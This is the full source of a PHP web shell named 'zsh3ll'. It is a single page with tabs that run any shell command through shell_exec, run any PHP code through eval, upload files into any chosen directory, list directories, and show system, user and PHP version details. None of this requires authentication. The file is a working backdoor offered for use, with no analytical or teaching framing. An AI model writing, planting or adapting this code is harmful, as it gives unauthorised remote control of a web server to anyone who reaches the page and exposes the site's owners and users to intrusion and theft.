<?php
// clean magic_quotes_gpc
if(get_magic_quotes_gpc()){
    foreach($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}
    foreach($_COOKIE as $k=>$v){$_COOKIE[$k] = stripslashes($v);}
}
$ds = DIRECTORY_SEPARATOR;
$wd = $_POST['wd'] ? $_POST['wd'] : ($_COOKIE['wd'] ? $_COOKIE['wd'] : getcwd());
if(is_dir($wd)){chdir($wd);}
else{$wd = getcwd();}
setcookie("wd", $wd);
$cmdi = $_POST['cmd'];if($cmdi){$cmdo=shell_exec($cmdi." 2>&1");}
$code = $_POST['code'];
if($_FILES['f']){move_uploaded_file($_FILES['f']['tmp_name'], $wd.$ds.$_FILES['f']['name']);}
?>
<head>
<title>zsh3ll</title>
<meta charset="utf-8">
<style>
body{width: 1200px;margin: auto;margin-bottom: 15px;margin-top: 15px;}
html,input{font-family: monospace;font-size:12px;}
	.tab {display: none}
	body{margin-top: 15px;}
	textarea{resize: none;width: 100%}
	input,textarea {-moz-appearance: none;-webkit-appearance: none;border: 1px solid #ccc;border-radius: 1px;padding: 4px;}
	input:focus,textarea:focus{outline: none;}
	span,button,input[type="button"],input[type="submit"],label{
    border-bottom: 2px solid #ccc;border-left: 0;border-right: 0;border-top: 0;color: #000;
    background-color: #ddd;display: inline-block;padding: 5px;
    font-family: "segoe ui","trebuchet MS","Lucida Sans Unicode","Lucida Sans",Sans-Serif;
    font-size: 12px;font-weight: 400;line-height: 12px;
    -moz-appearance: none;-webkit-appearance: none;
	}
	tr:nth-child(2n){background-color: #fafafa;}
	tr:hover{background: #fff1f3;}
	pre{font-size: 12px;}
</style>
</head>
<body>
	<span onclick="showTab(0)" class="tab-btn">file</span>
	<span onclick="showTab(1)" class="tab-btn">exec</span>
	<span onclick="showTab(2)" class="tab-btn">eval</span>
	<span onclick="showTab(3)" class="tab-btn">info</span>
	<br><br>
	<div class="tab" style="display: block;">
		<form method="POST" enctype="multipart/form-data" id="form0">
			<input type="text" name="wd" id="wd" value="<?php echo $wd;?>" style="width: 1140px;" autocomplete="off" />
			<input type="file" name="f" id="f" style="display: none;" onchange="form0.submit()"><label for="f" ondrop="event.preventDefault();f.files = event.dataTransfer.files;" ondragover="event.preventDefault();" style="width: 42px;text-align: center;">upload</label>
			<input type="hidden" name="fn" id="fn">
		</form>
		<table style="border: 1px dotted #ccc;width: 100%">
			<tr style="text-align:center"><th style="width: 900px">name</th><th style="width: 100px">created</th><th style="width: 100px">modified</th><th style="width: 100px">size</th></tr>
			<?php 
			foreach(glob("*") as $i){
				if(is_dir($i)){
					echo "<tr><td>[".$i."]</td><td class='date'>".filectime($i)."</td><td class='date'>".filemtime($i)."</td><td class='size'></td></tr>\n";
				}
				else {
					echo "<tr><td>".$i."</td><td class='date'>".filectime($i)."</td><td class='date'>".filemtime($i)."</td><td class='size'>".filesize($i)."</td></tr>\n";
				}
			}
			?>
		</table>
	</div>
	<div class="tab">
		<form method="POST">
			<input type="text" name="cmd" value="<?php echo htmlentities($cmdi);?>" style="width: 100%" autocomplete="off" />
		</form>
		<?php
		if($cmdi){echo "<pre>".htmlentities($cmdo)."</pre>";}
		?>
	</div>
	<div class="tab">
		<form method="POST">
		<textarea name="code" rows="10"></textarea><br><br>
		<input type="submit" value="submit" style="width: 100%">
		</form>
		<pre><?php if($code)eval($code);?></pre>
	</div>
	<div class="tab">
	<pre style="margin-top: 0px;"><?php echo "OS : ".php_uname()."\nUSER : ".get_current_user()."\nPHP : ".PHP_VERSION;?></pre>
	</div>
<script>
var tabs = document.getElementsByClassName("tab");
var tabBtns = document.getElementsByClassName("tab-btn");
var href = window.location.href;
href.indexOf("#") < 0 ? showTab(0) : showTab(href.substr(href.indexOf("#")+1));
function showTab(t){
	href = href.substr(0, href.indexOf("#"))+"#"+t;
	window.location.href=href;
	for(var i=0;i<tabs.length;i++){
		if(i==t){tabs[i].style.display="block";tabBtns[i].style.borderBottom="2px solid #aa66cd";}
		else {tabs[i].style.display="none";tabBtns[i].style.borderBottom="2px solid #ccc";}
	}
}
for(let e of document.getElementsByClassName('date')){
	let d = new Date(+e.innerText*1000);
	e.innerHTML = `${d.getDate()}.${d.getMonth()+1}.${d.getFullYear()}`;///${d.getHours()}:${d.getMinutes()}
}
</script>
</body>
